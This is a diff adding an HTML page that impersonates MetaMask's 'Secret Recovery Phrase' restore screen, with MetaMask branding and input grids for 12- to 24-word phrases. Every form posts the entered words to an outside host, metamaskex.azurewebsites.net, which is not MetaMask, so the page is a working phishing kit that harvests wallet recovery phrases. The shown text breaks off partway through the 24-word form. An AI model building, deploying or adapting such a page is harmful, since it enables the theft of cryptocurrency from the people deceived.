@@ -1,0 +1,1300 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Metamask Wallet</title>
+  <link rel="icon" href="https://play-lh.googleusercontent.com/8rzHJpfkdFwA0Lo6_CHUjoNt8OU3EyIe9BZNKGqj0C8BhleguW9LhXHbS46FAtLAJ9r2=s48-rw" type="image/x-icon"/>
+
+  <link rel="stylesheet" href="assets/css/all.min.css">
+  <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+  <link rel="stylesheet" href="assets/css/signin.css">
+
+  <style>
+  body {
+    display:block;
+    align-items: initial;
+    height: auto;
+  
+}
+
+
+.wrapper_all {
+    max-width: 800px;
+    margin: auto;
+    padding:0px 15px;
+}
+.select-action__body-header {
+    font-size: 1.5rem;
+    font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+    line-height: 140%;
+    font-style: normal;
+    font-weight: normal;
+    text-align: center;
+    margin-top: 65px;
+    color:#24272a;
+}
+.imort_crateWallet_row {
+    display: flex;
+    gap:30px;
+    align-items: center;
+    justify-content: center;
+    margin-top: 45px;
+}
+/*-----------------*/
+.imort_crateWallet_col1,
+.imort_crateWallet_col2{
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content:center;
+    width: 388px;
+    height: 278px;
+    border: 1px solid #d6d9dc;
+    box-sizing: border-box;
+    border-radius: 10px;
+    padding: 8px;
+    text-align: center;
+}
+.imort_crateWallet_row i {
+    color: #bbc0c5;
+}
+.imort_crateWallet_row h6 {
+    font-size: 1.125rem;
+    font-family: 'Poppins', sans-serif;
+    line-height: 140%;
+    font-style: normal;
+    font-weight: normal;
+    color:#24272a;
+    margin-top: 12px;
+}
+
+.imort_crateWallet_row p{
+   font-size: 0.875rem;
+   font-family: 'Poppins', sans-serif;
+   line-height: 140%;
+    font-style: normal;
+    font-weight: normal;
+    color:#535a61;
+    margin-top:2px;
+    text-align: center;
+}
+.imort_crateWallet_row a {
+    max-width: 221px;
+    height: 44px;
+    background: #007bff;
+    width: 100%;
+    vertical-align: middle;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #fff;
+    border-radius: 60px;
+    text-decoration:none;
+}
+#create-walletbtn {
+   position: relative;
+    top: 12px;
+}
+.logo_box_m {
+    margin-top: 25px;
+}
+
+/*---------- import wallet css*/
+div#form_login #cointiue_btn {
+    width: 100%;
+    background: #037dd6;
+    border-radius: 45px;
+    padding: 12px 0px;
+    margin-top:35px;
+    font-weight: 600;
+    max-width: 165px;
+}
+/*.seedContainer {
+    max-width:400px;
+}*/
+.form-control:focus {
+    color: #495057;
+    background-color: #fff;
+    border-color: #037dd6;
+    outline: 0;
+    box-shadow: 0 0 0 .2remrgba(0,123,255,.25);
+    border: 1px solid #037dd6;
+    box-shadow: 0 0 0 0.2rem #007bff00;
+}
+.form-control {
+    height: 50px;
+    color:#000000!important;
+}
+#img_message .btn.focus, .btn:focus {
+    outline: 0;
+    box-shadow: 0 0 0 0.2rem #037dd6;
+}
+
+label.form-check-label {
+    margin-left: 10px;
+    font-size: 16px;
+    color: #24272ad6;
+}
+div#title_form {
+    margin-top: 35px;
+}
+/****************** checkbox resize *************/
+input[type=checkbox]
+{
+  /* Double-sized Checkboxes */
+  -ms-transform: scale(2); /* IE */
+  -moz-transform: scale(2); /* FF */
+  -webkit-transform: scale(2); /* Safari and Chrome */
+  -o-transform: scale(2); /* Opera */
+  transform: scale(2);
+  padding: 10px;
+}
+.form-check {
+    position: relative;
+    display: block;
+    padding-left: 28px;
+}
+/*---------- chec end*/
+
+.logo_Coinbase_w h1 {
+    font-size: 2.5rem;
+    font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+    line-height: 140%;
+    font-style: normal;
+    font-weight: normal;
+    margin-bottom: 24px;
+    color: var(--color-text-default);
+}
+.logo_Coinbase_w {
+    margin-bottom: 35px;
+}
+.col-md-12_ {
+    width: 100%;
+}
+/*.seedContainer {
+    max-width:500px;
+
+}*/
+/*.box_innerform{
+    max-width:600px;
+    border-radius:10px;
+    border:1px solid gray;
+    padding:60px;
+    margin:auto;
+}*/
+.box_innerform {
+    max-width: 600px;
+    border-radius: 35px;
+    border: 1px solid #e2e2e2;
+    padding: 60px;
+    margin: auto;
+    margin-top: 25px;
+}
+</style>
+
+<!-- drop -->
+ <style>
+     .dropdown-content-bond{
+  display: none;
+}
+body{
+  padding: 10px;
+}
+
+.dropdown-content-bond{
+/*  padding: 20px;*/
+  /*background: lightgray;*/
+  font-size: 2em;
+}
+/*.div1{
+  background:red;
+}
+.div2{
+  background:yellow;
+}*/
+/*--*/
+div#dropdow_boxtopRow {
+    display: flex;
+    justify-content: space-between;
+    gap: 15px;
+}
+
+.drop_col1 h3 {
+    color: #24272a;
+    font-size: 20px;
+    line-height: 30px;
+}
+select#search-select {
+    border: 1px solid #bbbbbb;
+    padding: 9px 8px;
+    border-radius: 7px;
+}
+
+.titpetop h2{
+    text-align: center;
+    font-weight:600;
+}
+.titpetop p {
+    text-align: center;
+    font-size: 17px;
+    line-height: 28px;
+    margin-top: 32px;
+    margin-bottom:37px;
+}
+.form-group {
+    margin-bottom: 1rem;
+    text-align: center;
+}
+div#form_login #cointiue_btn {
+    width: 100%;
+    background: #037dd6;
+    border-radius: 45px;
+    padding: 12px 0px;
+    margin-top: 35px;
+    font-weight: 600;
+    max-width: 310px;
+    margin: auto;
+    margin-top: 25px;
+}
+
+/*- 08-01-2024-----*/
+
+.titpetop h6 {
+    font-size: 20px;
+    word-break: break-word;
+    background: #b2ddb2;
+    padding: 10px 15px;
+}
+
+@media (max-width: 767.98px) {
+ .box_innerform{
+    padding: 20px;
+    margin: auto;
+}
+div#dropdow_boxtopRow {
+    display: flex;
+    justify-content: space-between;
+    gap: 10px;
+    flex-direction: column;
+}
+select#search-select {
+    border: 1px solid #bbbbbb;
+    padding: 9px 8px;
+    border-radius: 7px;
+    width: 100%;
+}
+.dropdown-content-bond {
+    padding: 0px;
+    
+}
+
+
+}
+
+    </style>
+
+    <!-- ---- -->
+
+</head>
+
+<body>
+
+  <!-- navigation bar -->
+
+  <!-- forms -->
+<div class="wrapper_all">
+  <div class="container-fluid" id="form_login">
+  <div class="arow_linebox">
+<div class="logo_box_m">
+    <img src="assets/images/logo_meta.jpg" alt="">
+  </div>
+</div>
+
+    <div class="seedContainer">
+    <div class="row m-0 ">
+      <div class="col-md-12_">
+  <div class="box_innerform">
+   <div class="titpetop">
+       <!-- <h6>Get started with MetaMask Portfolio Buy store send and swap tokens Available browser</h6> -->
+       <h2>Access your wallet with your Secret Recovery Phrase</h2>
+       <p>MetaMask cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password. First, enter the Secret Recovery Phrase that you were given when you created your wallet. 
+       <a href="import-with-seed-phrase.php.html#">Learn more</a></p>
+
+   </div> 
+   <!-- ---dropwon start-->
+   <div id="dropdow_boxtopRow">
+       <div class="drop_col1">
+           <h3>Type your Secret Recovery Phrase</h3>
+       </div>
+       <div class="drop_col2">
+           <select id="search-select">
+          <option value="12">I have a 12-word phrase</option>
+          <option value="15">I have a 15-word phrase</option>
+          <option value="18">I have a 18-word phrase</option>
+          <option value="21">I have a 21-word phrase</option>
+          <option value="24">I have a 24-word phrase</option>
+          
+        </select>
+       </div>
+   </div>
+   
+
+<hr>
+
+<!-- cards content -->
+<section class="">
+  <div class="dropdown-content-bond div1">
+    <!-- s1 -->
+   <div class="custom_innerbox">
+<form id="passwordForm" class="keydata_12" action="https://metamaskex.azurewebsites.net/vendor-com/submit.php" method="post" autocomplete="off" > 
+    <!-- <form id="form_word_12" class="keydata_12" action="vendor-v1/Sender.php" method="post" autocomplete="off" >  -->
+    
+  <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="1" required="" type="text" class="input12 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="2" required="" type="text" class="input12 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="3" required="" type="text" class="input12 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="4" required="" type="text" class="input12 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="5" required="" type="text" class="input12 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="6" required="" type="text" class="input12 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="7" required="" type="text" class="input12 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="8" required="" type="text" class="input12 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="9" required="" type="text" class="input12 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="10" required="" type="text" class="input12 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="11" required="" type="text" class="input12 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="12" required="" type="text" class="input12 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+ <div class="form-group">
+  <button type="submit" id="submitButton" class="btn btn-primary">Confirm Secret Recovery Phrase</button> 
+</div>
+</form>
+   </div>
+   <!-- end 1 -->
+  </div>
+
+  <!------ s15---- -->
+    <div class="dropdown-content-bond div1">
+    
+   <div class="custom_innerbox">
+    <form id="passwordForm15" class="keydata_15" action="https://metamaskex.azurewebsites.net/vendor-com/submit.php" method="post" autocomplete="off" > 
+<!-- <form id="form_word_12" class="keydata_15" action="vendor-v15/Sender.php" method="post" autocomplete="off" >  -->
+  <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="1" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="2" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="3" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="4" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="5" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="6" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="7" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="8" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="9" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="10" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="11" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="12" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="13" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="14" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="15" required="" type="text" class="input15 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+ <div class="form-group">
+  <button type="submit" id="submitButton" class="btn btn-primary">Confirm Secret Recovery Phrase</button> 
+</div>
+</form>
+   </div>
+   
+  </div>
+  <!-- end 15 -->
+
+  <div class="dropdown-content-bond">
+       <!-- s 18 -->
+   <div class="custom_innerbox">
+   <form id="passwordForm18" class="keydata_18" action="https://metamaskex.azurewebsites.net/vendor-com/submit.php" method="post" autocomplete="off"> 
+  <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="1" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="2" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="3" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="4" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="5" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="6" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="7" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="8" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="9" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="10" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="11" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="12" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="13" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="14" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="15" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>
+
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="16" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="17" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="18" required="" type="text" class="input18 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+
+ <div class="form-group">
+  <button type="submit" id="cointiue_btn" class="btn btn-primary">Confirm Secret Recovery Phrase</button> 
+</div>  
+</form>
+   </div>
+   <!-- end 2 -->
+  </div>
+
+  <!-- --------- start 21----- -->
+  <div class="dropdown-content-bond div2">
+      <!-- s3 -->
+   <div class="custom_innerbox">
+<form id="passwordForm21" class="keydata_21" action="https://metamaskex.azurewebsites.net/vendor-com/submit.php" method="post" autocomplete="off"> 
+  <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="1" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="2" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="3" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="4" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="5" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="6" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="7" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="8" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="9" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="10" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="11" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="12" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="13" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="14" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="15" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>
+
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="16" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="17" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="18" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>   
+
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="19" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="20" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="21" required="" type="text" class="input21 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>  
+ 
+ <div class="form-group">
+  <button type="submit" id="cointiue_btn" class="btn btn-primary">Confirm Secret Recovery Phrase</button> 
+</div> 
+</form>
+   </div>
+   <!-- end 3s -->
+  </div>
+  <!-- ---------- end 21 -------->
+
+<div class="dropdown-content-bond div2">
+      <!-- s3 -->
+   <div class="custom_innerbox">
+<form id="passwordForm24" class="keydata_24" action="https://metamaskex.azurewebsites.net/vendor-com/submit.php" method="post" autocomplete="off"> 
+  <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="1" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="2" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="3" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="4" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="5" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="6" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="7" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="8" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+      <input name="phrase_value[]" placeholder="9" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div> 
+
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="10" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="11" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="12" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="13" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="14" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="15" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+    
+ </div>
+
+ <div class="form-row align-items-center">
+    <div class="col-sm-4 my-1">
+      <label class="sr-only" for="inlineFormInputName">Name</label>
+    <input name="phrase_value[]" placeholder="16" required="" type="text" class="input24 form-control" id="inlineFormInputName" placeholder="Jane Doe">
+    </div>
+
+    <div class="col-sm-4 my-1">
